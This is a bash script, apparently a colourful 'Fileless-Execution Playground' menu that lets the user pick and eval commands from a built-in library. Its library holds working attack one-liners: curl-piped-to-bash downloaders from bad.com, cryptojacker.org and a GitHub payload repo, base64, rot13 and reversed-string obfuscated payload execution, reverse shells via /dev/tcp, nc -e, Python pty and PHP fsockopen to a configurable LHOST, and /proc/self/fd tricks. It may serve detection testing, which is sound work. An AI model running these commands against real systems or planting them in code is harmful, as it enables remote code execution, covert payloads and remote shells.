#!/usr/bin/env bash
#
# fileless-menu.sh  –  colourful file-less demo runner
# ------------------------------------------------------------------
#  chmod +x fileless-menu.sh
#  ./fileless-menu.sh
#
#  • No ‘set -u’:  undefined vars will not abort the script.
#  • LHOST / LPORT* get defaults (127.0.0.1 / 444{1,2,3})
#    and you can override them interactively.
# ------------------------------------------------------------------

set -eo pipefail    # stop on real errors, ignore unset vars

# ── ANSI colours ──────────────────────────────────────────────────
RESET='\033[0m'; BOLD='\033[1m'
BLU='\033[1;34m'; CYN='\033[1;36m'
GRN='\033[1;32m'; YEL='\033[1;33m'
RED='\033[1;31m'; MAG='\033[1;35m'

declare -A CAT_COL=(
  [Downloaders]="$GRN"
  [Encoding]="$YEL"
  [ReverseShells]="$RED"
  [AdvancedFD]="$MAG"
)

# ── Command library  (verbatim from your list) ────────────────────
declare -A categories
categories[Downloaders]='
# 1
curl -s http://example.com/script.sh | bash
# 2
exec 3< <(curl -s http://bad.com/payload.sh); bash /proc/self/fd/3
# 3
X=$(curl -s http://cryptojacker.org/liorpayload.py); python3 -c "$X"
# 4
bash -c "$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/payload.sh)"
'

categories[Encoding]='
# 5
echo "ZXhlYyAiQjY0IHBheWxvYWQgc3VjY2VzcyIK" | base64 -d | bash
# 6
bash -c "$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/b64.txt | base64 -d)"
# 7
bash -c "$(echo ENFUGBYY | tr A-Za-z N-ZA-Mn-za-m | base64 -d)"
# 8
exec 8< <(openssl enc -d -base64 <<< L2Jpbi9zaCAtYyBlY2hvIGhlbGxv); bash /proc/self/fd/8
'

categories[ReverseShells]='
# 9
timeout 2s bash -c "bash -i >& /dev/tcp/${LHOST}/${LPORT1} 0>&1" &
#10
timeout 2s nc -e /bin/sh ${LHOST} ${LPORT1} &
#11
timeout 2s python3 -c "import os,pty,socket,sys; s=socket.socket(); s.connect((\"${LHOST}\",${LPORT2})); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"/bin/sh\")" &
#12
timeout 2s php -r "\$s=fsockopen(\"${LHOST}\",7777);exec(\"/bin/sh -i <&3 >&3 2>&3\");" &
#13
timeout 2s bash -c "bash -i >& /dev/tcp/${LHOST}/${LPORT3} 0>&1" &
'

categories[AdvancedFD]='
#14
exec 3< <(echo "hs.doaolyp/moc.dab//:ptth" | rev | xargs curl -s); bash /proc/self/fd/3
#15
exec 3< /bin/bash; /proc/self/fd/3 -c "echo executed FD shell"
#16
exec {FD}<>/dev/tcp/${LHOST}/9898; echo whoami >&$FD; cat <&$FD &
#17
exec 9< <(dd if=/dev/zero bs=0 count=0 | curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/shell.sh); bash /proc/self/fd/9
#18
python3 - <<'PY'
import urllib.request, sys
print("[*] Inline Python payload executed (test.py)")
exec(urllib.request.urlopen("https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/test.py").read().decode())
PY
'

# ── Defaults & helper for network variables ───────────────────────
LHOST=${LHOST:-127.0.0.1}
LPORT1=${LPORT1:-4441}
LPORT2=${LPORT2:-4442}
LPORT3=${LPORT3:-4443}

ensure_net_vars() {
  read -rp "LHOST [${LHOST}]: " tmp && [[ $tmp ]] && LHOST=$tmp
  read -rp "LPORT1 [${LPORT1}]: " tmp && [[ $tmp ]] && LPORT1=$tmp
  read -rp "LPORT2 [${LPORT2}]: " tmp && [[ $tmp ]] && LPORT2=$tmp
  read -rp "LPORT3 [${LPORT3}]: " tmp && [[ $tmp ]] && LPORT3=$tmp
}

# ── UI helpers ────────────────────────────────────────────────────
draw_categories() {
  echo -e "\n${BOLD}== Choose a category ==${RESET}"
  local i=0
  for cat in "${!categories[@]}"; do
    printf "%s%2d%s) %b%s%b\n" "$BLU" "$((++i))" "$RESET" "${CAT_COL[$cat]}" "$cat" "$RESET"
  done
}

draw_commands() {
  local cat="$1" cmdlines=()
  while IFS= read -r ln; do [[ $ln ]] && cmdlines+=("$ln"); done <<<"${categories[$cat]}"
  echo -e "\n${BOLD}== $cat commands ==${RESET}"
  for ((i=0; i<${#cmdlines[@]}; i+=2)); do
    num="${cmdlines[i]//\# }"
    printf "%s%2d%s) %s\n" "$CYN" "$num" "$RESET" "${cmdlines[i+1]}"
  done
}

run_cmd() {        # run with nounset off to avoid surprises
  local cmd="$1"
  echo -e "\n${BOLD}[ ▶ ]${RESET} $cmd\n"
  set +u
  eval "$cmd"
  set -u
  echo -e "\n${GRN}✔ Done.${RESET}  Press Enter…"
  read -r
}

# ── Main loop ─────────────────────────────────────────────────────
while true; do
  clear
  echo -e "${BOLD}${MAG}*** Fileless-Execution Playground ***${RESET}"
  draw_categories
  read -rp $'\nCategory (number, q=quit): ' choice || exit 0
  [[ $choice =~ ^[Qq]$ ]] && exit

  cat_keys=("${!categories[@]}")
  sel_cat="${cat_keys[choice-1]}"
  [[ -z $sel_cat ]] && { echo "Invalid"; sleep 1; continue; }

  draw_commands "$sel_cat"
  read -rp $'\nCommand ID (b=back): ' num || exit 0
  [[ $num =~ ^[Bb]$ ]] && continue

  # grab the command text
  cmd=$(grep -A1 -E "^# *$num$" <<<"${categories[$sel_cat]}" | tail -n1)
  [[ -z $cmd ]] && { echo "Invalid"; sleep 1; continue; }

  # prompt for network details if the cmd references them
  [[ $cmd == *'${LHOST}'* ]] && ensure_net_vars

  # substitute vars, then run
  run_cmd "$(eval "echo \"$cmd\"")"
done
